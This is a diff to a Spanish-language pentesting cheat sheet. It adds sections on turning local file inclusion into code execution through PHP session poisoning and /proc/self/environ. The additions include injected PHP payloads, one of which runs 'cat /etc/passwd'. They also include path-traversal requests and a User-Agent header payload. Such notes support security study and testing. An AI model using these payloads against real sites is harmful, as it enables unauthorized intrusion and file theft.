@@ -38,6 +38,7 @@
        * [RFI (Remote File Inclusion)](#lfi)
        * [LFI to RCE](#lfi-to-rce)
        * [LFI to RCE via PHP Sessions](#lfi-to-rce-via-php-sessions)
+       * [LFI to RCE via /proc/self/environ](#lfi-to-rce-via-environ)
        * [LFI RFI using Wrappers](#lfi-rfi-using-wrappers) 
        * [SQLI (SQL Inyection)](#sqli)     
        * [Shellshock](#shellshock)
@@ -1744,7 +1745,40 @@ Otra de las técnicas para conseguir la ejecución de comandos a través de un *
 
 #### LFI to RCE via PHP Sessions
 
-Para este caso, comprobamos
+Para este caso, comprobamos si el sitio web cuenta usa **PHP SESSION** (_PHPSESSID_):
+
+```bash
+Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
+Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
+```
+
+En PHP, estas sesiones son almacenadas en la ruta '**/var/lib/php5/sess[PHPSESSID]**':
+
+```bash
+/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
+user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
+```
+
+La idea es setear la Cookie a `<?php system('cat /etc/passwd');?>`:
+
+```bash
+login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
+```
+
+Una vez hecho, podemos incluir el archivo PHP de la siguiente forma a través del LFI:
+
+```bash
+login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
+```
+
+#### LFI to RCE via PHP Environ
+
+Si por algún casual podemos visualizar el recurso **/proc/self/environ**, como si se tratara de un recurso log, enviaremos nuestro Payload en el User-Agent:
+
+```bash
+GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
+User-Agent: <?=phpinfo(); ?>
+```
 
 #### SQLI
 
